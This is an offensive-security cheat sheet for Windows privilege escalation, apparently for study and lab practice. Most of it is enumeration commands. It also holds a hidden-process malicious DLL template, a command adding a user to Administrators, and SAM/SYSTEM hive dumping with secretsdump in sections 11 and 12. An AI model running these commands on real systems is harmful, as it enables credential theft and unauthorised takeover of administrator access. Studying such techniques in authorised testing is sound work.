Windows Privilege Escalation — cheat sheet

Enumeration and common Windows privilege-escalation vectors via CMD and PowerShell: services, permissions, scheduled tasks, DLL hijacking and hash dumping.

// disclaimer
Content created strictly for educational purposes and the study of offensive security. Using these techniques against systems without prior authorization is illegal.

1. Basic enumeration

Identity and privileges

whoami
whoami /priv            # Shows the user's privileges
whoami /all             # Full user information

Users and groups

net user                # Lists machine users
net user <user>          # User details
net localgroup          # Lists local groups

net localgroup "Remote Desktop Users"
net localgroup Administrators

2. Files and directories

Hidden files

# CMD
dir /a

# PowerShell
Get-ChildItem -Force
dir -Force

Recursive search (equivalent to Linux find)

Get-ChildItem -Path "C:\Program Files" -Recurse -Force

# Ignore errors: -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Program Files\Corporate Tools" -Recurse -Force -ErrorAction SilentlyContinue

3. Content search (equivalent to grep)

# Count lines
Get-Content .\events.csv | Measure-Object

# Search for a specific word
Get-Content .\events.csv | Select-String "word"
Select-String -Path .\events.csv -Pattern "word"

4. Windows registry

# List specific keys
Get-ChildItem "HKLM:\SOFTWARE\CorporateApps\"

# Search recursively
Get-ChildItem "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue |
  Get-ItemProperty -ErrorAction SilentlyContinue |
  Where-Object { $_ -match "desired_string" }

# CMD alternative
reg query <key>

5. Permissions (ACL)

# CMD
icacls <file>

# PowerShell
Get-Acl .\file.txt | Format-List

6. Interesting files

# Search for backups
dir C:\ -Recurse -Filter "*.bak" -ErrorAction SilentlyContinue | Select-Object FullName

# Always check permissions
icacls <file>

7. Run as another user (equivalent to su)

runas /user:svcadmin powershell

# Alternative: RunasCs (runs without an interactive password prompt)

8. Scheduled tasks

# CMD
schtasks /query /fo List /v
schtasks /query /fo List /v | findstr <name>

# PowerShell
Get-ScheduledTask

9. Services

# CMD
sc qc ServiceName

# PowerShell
Get-CimInstance Win32_Service -Filter "Name='ServiceName'"

# Running services
Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" }

# Show the service Path
Get-CimInstance Win32_Service -Filter "Name='ServiceName'" | Select-Object Name, PathName

10. Local port enumeration

netstat -ano
Get-NetTCPConnection

# Test a local endpoint
iwr -uri http://127.0.0.1:PORT
iwr -uri http://127.0.0.1:PORT -UseBasicParsing

11. DLL hijacking (concept)

Conditions to check:

  • Service running as LocalSystem
  • Weak permissions on the service folder
  • DLL missing from the execution directory

Basic structure of a malicious DLL (C#):

using System;
using System.Diagnostics;

public class Helper
{
    public static void Init()
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c command_here",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        });
    }
}

Command example — adds a user to the administrators group:

/c net localgroup Administrators svcadmin /add

# PowerShell with elevated privileges
Start-Process powershell -Verb runAs

12. Hash dumping

# Save the registry hives
reg save HKLM\SECURITY C:\Temp\security.save
reg save HKLM\SYSTEM   C:\Temp\system.save
reg save HKLM\SAM      C:\Temp\sam.save

# Offline extraction
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Enable Restricted Admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0

Mental checklist — Windows PrivEsc

  • Check privileges (whoami /priv)
  • Review administrative groups
  • Search for backup files
  • Look for credentials in files
  • Enumerate services
  • Check for weak permissions (icacls)
  • Review scheduled tasks
  • Check local ports
  • Inspect the registry
  • Assess DLL hijacking potential
